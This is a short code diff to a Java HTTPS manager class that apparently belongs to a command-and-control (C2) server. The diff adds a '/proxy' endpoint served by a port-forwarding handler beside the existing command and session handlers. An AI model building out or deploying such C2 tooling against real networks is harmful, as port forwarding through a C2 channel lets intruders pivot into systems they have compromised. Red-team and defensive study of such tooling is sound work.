@@ -156,6 +156,8 @@ public class HTTPSManager extends C2Interface{
             httpServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTCMDREST), new CommandHandler(io));
             httpServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTGETSESSIONS), new SessionRequestHandler(io));
             
+            httpsServer.createContext("/proxy", new PortForwardHandler(io));
+            
             httpsServer.setExecutor(null); // creates a default executor
             System.out.println("HTTPS online: " + port);
             httpsServer.start();
